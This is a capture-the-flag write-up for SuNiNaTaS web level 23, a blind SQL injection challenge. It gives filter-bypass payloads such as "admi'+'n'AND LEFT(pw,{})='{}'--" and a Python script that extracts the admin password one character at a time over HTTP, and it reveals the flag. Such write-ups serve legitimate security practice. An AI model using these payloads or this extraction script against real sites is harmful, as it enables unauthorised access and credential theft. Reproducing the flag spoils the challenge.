# Level 23   Hard Blind SQLi

[http://suninatas.com/challenge/web23/web23.asp](http://suninatas.com/challenge/web23/web23.asp)

![level-23---hard-blind-sqli.png](/assets/ctf/suninatas/web/level-23-hard-blind-sqli.png)

The `...` in description means there are more filters which are not listed. 

There seems to be Length limit of 30 characters and `LIKE` keyword is banned. 
`#` is also banned. 

I thought the database would be MySQL, but it turned out to be Microsoft!

```
' OR id IN ('admi'||'n') -- -
admi'+'n' -- -
```

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Payload thinking progress...
```python
# Stuff requires substring and `=`
PAYLOAD = "admi'+'n' AND STUFF(pw,{},100,'')='{}'--"
PAYLOAD = "admi'+'n'AND STUFF(pw,{},99,'')='{}'--"

# Exceeds length
PAYLOAD = "admi'+'n'AND LEFT(pw,{})='{}'--"
PAYLOAD = "admi'+'n'AND RIGHT(pw,{})='{}'--"
PAYLOAD = "admi'+'n'AND MID(pw,{})='{}'--"

# Dont use comment, use the quote from query
# Substring is still required, length limit problem
PAYLOAD = "admi'+'n'AND LEFT(pw,{})='{}"
```

To leak the password ideally we need a truthy condition. If we manage to leak characters of password we can bruteforce the start or the end, considering no other user has same password (or similar).
Example:
```python
guest password = guest
admin password = admin

WHERE LEFT(pw,1)='g' # -> returns guest
WHERE LEFT(pw,1)='a' # -> returns admin

WHERE LEFT(pw,2)='gu' # -> returns guest
WHERE LEFT(pw,2)='ad' # -> returns admin

...
```

Leak the first character:
```python
import requests
import string

URL = 'http://suninatas.com/challenge/web23/web23.asp'
CHARSET = string.ascii_letters + string.digits + '(){}!?,_'
PAYLOAD = "admi'+'n'AND LEFT(pw,{})='{}'--"

password = 'v3'
password_i = len(password) + 1
while True:
    for c in CHARSET:
        print(f'\r[{password_i}] {password}{c}', end='')
        search = PAYLOAD.format(password_i, password+c)
        if len(search) > 30:
            print(f'\r[Password] {password}{" "*16}')
            print("[Error] Length limit reached")
            exit()
        resp = requests.get(URL, params={'id': search, 'pw': 'uwu'})
        if 'OK' in resp.text:
            password += c
            password_i += 1
            break
    else:
        print(f'\r[Password] {password}{" "*16}')
        break
```

```python
# Leak full LEFT
password = 'v3'
PAYLOAD = "'OR LEFT(pw,{})='{}'--"

[Password] v3ryhardsq
[Error] Length limit reached

# Leak last RIGHT
password = ''
PAYLOAD = "admi'+'n'AND RIGHT(pw,{})='{}'--"

[Password] i
[Error] Length limit reached

# Leak full RIGHT
password = 'i'
PAYLOAD = "'OR RIGHT(pw,{})='{}'--"
search = PAYLOAD.format(password_i, c+password[::-1])
print(f'\r[Password] {password[::-1]}{" "*16}')

[Password] ardsqli
```

::: tip Flag
`v3ryhardsqli`
:::
